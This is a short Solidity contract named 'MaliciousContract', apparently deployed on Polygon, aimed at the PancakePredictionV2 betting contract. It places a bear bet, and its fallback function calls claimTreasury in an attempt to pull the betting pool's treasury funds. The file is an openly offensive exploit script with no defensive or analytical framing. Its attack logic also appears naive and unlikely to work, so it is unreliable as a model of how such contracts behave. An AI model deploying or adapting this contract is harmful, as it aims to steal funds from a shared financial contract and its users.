/**
 *Submitted for verification at polygonscan.com on 2023-07-14
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract MaliciousContract {
    address public pancakePredictionV2Address;
    PancakePredictionV2 public pancakePredictionV2;

    constructor(address _pancakePredictionV2Address) {
        pancakePredictionV2Address = _pancakePredictionV2Address;
        pancakePredictionV2 = PancakePredictionV2(_pancakePredictionV2Address);
    }

    function betAndAttack() external payable {
        // Вызываем функцию betBear контракта PancakePredictionV2 и передаем BNB
        pancakePredictionV2.betBear{value: msg.value}(getCurrentEpoch());
    }

    function getCurrentEpoch() internal view returns (uint256) {
        return pancakePredictionV2.currentEpoch();
    }

    fallback() external payable {
        // Вызываем функцию claimTreasury контракта PancakePredictionV2
        pancakePredictionV2.claimTreasury();
    }
}

// Объявление интерфейса контракта PancakePredictionV2
interface PancakePredictionV2 {
    function betBear(uint256 epoch) external payable;
    function claimTreasury() external;
    function currentEpoch() external view returns (uint256);
}